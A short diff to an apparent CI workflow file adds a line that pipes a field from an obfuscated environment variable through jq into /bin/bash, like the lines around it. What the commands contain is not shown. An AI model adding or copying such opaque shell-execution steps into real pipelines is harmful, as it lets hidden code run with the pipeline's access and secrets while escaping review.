@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$ubm886" | jq -r .v4 | /bin/bash
           echo $vs66 | jq -r .vnkz229 | /bin/bash
           printf '%s' "$ksts88" | jq -r .rm7 | /bin/bash
+          printf '%s' "$y410" | jq -r .x12 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
